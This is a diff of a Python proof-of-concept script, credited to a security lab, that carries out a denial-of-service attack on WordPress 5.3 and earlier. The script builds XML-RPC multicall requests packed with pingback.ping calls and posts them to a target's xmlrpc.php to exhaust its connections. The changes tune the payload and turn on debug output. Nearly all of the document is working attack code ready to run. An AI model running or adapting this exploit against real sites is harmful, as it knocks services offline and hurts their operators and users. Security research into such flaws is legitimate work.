@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# CVE-2019-XXXX WordPress <=5.3.? Denial-of-Service PoC
+# WordPress <= 5.3.? Denial-of-Service PoC
 # Abusing pingbacks+xmlrpc multicall to exhaust connections
 # @roddux 2019 | Arcturus Security | labs.arcturus.net
 # TODO:
@@ -9,15 +9,19 @@ from urllib.parse import urlparse
 import sys, uuid, urllib3, requests
 urllib3.disable_warnings()
 
-DEBUG = False
+DEBUG = True 
 def dprint(X):
 	if DEBUG: print(X)
 
+COUNT=0
 def build_entry(pingback,target):
+	global COUNT
+	COUNT +=1
 	entry  = "<value><struct><member><name>methodName</name><value>pingback.ping</value></member><member>"
-	entry += f"<name>params</name><value><array><data><value>{pingback}/{uuid.uuid4()}</value>"
-	#entry += f"<value>{target}/?p=1</value></data></array></value></member></struct></value>"
-	entry += f"<value>{target}/#e</value></data></array></value></member></struct></value>" # taxes DB more
+	entry += f"<name>params</name><value><array><data><value>{pingback}/{COUNT}</value>"
+	#entry += f"<name>params</name><value><array><data><value>{pingback}/{uuid.uuid4()}</value>"
+	entry += f"<value>{target}/?p=1</value></data></array></value></member></struct></value>"
+	#entry += f"<value>{target}/#e</value></data></array></value></member></struct></value>" # taxes DB more
 	return entry
 
 def build_request(pingback,target,entries):
@@ -44,7 +48,7 @@ def get_args():
 	return (action,pingback,target)
 
 def main(action,pingback,target):
-	print("[>] CVE-2019-XXXX WordPress <= 5.3.? Denial-of-Service PoC")
+	print("[>] WordPress <= 5.3.? Denial-of-Service PoC")
 	print("[>] @roddux 2019 | Arcturus Security | labs.arcturus.net")
 	# he checc
 	if action == "check":    entries = 2
@@ -56,6 +60,7 @@ def main(action,pingback,target):
 	print(f"[+] Got pingback URL \"{pingback}\"")
 	print(f"[+] Got target URL \"{target}\"")
 	print(f"[+] Building {entries} pingback calls")
+	# entries = 1000 # TESTING
 	xmldata = build_request(pingback,target,entries)
 	dprint("[+] Request:\n")
 	dprint(xmldata+"\n")
@@ -80,12 +85,15 @@ def main(action,pingback,target):
 	elif action == "check":
 		print("[+] Sending check request")
 		try:
-			resp = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False)
+			resp = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False, timeout=10)
 			if resp.status_code != 200:
 				print(f"[!] Received odd status ({resp.status_code}) -- check target url")
 			print("[+] Request sent")
-			print("[+] Response snippet:\n")
-			print(resp.content.decode("UTF-8")[0:500]+"\n")
+			print("[+] Response headers:\n")
+			print(resp.headers)
+			print("[+] Response dump:")
+			print(resp.content.decode("UTF-8"))
+			print("[+] Here's the part where you figure out if it's vulnerable, because I CBA to code it")
 		except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
 			print("[!] Connection error")
 			exit(1)
